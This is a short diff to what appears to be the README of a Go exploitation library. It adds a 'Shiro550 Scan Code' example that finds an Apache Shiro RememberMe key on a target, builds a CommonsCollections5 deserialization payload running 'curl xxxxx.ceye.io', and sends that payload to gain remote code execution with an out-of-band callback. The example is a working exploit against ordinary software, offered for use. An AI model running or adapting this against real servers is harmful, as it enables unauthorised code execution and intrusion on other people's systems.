@@ -46,6 +46,22 @@ func main()  {
 }
 ```
 
+Shiro550 Scan Code
+
+```go
+......
+func TestFindShiro(t *testing.T) {
+	target := "http://192.168.222.132:8080/"
+	key := shiro.CheckShiroKey(target)
+	if key != "" {
+		log.Info("find key: %s", key)
+	}
+	payload := gososerial.GetCC5("curl xxxxx.ceye.io")
+	shiro.SendPayload(key, payload, target)
+}
+......
+```
+
 ## About
 
 参考了xray中p师傅的代码
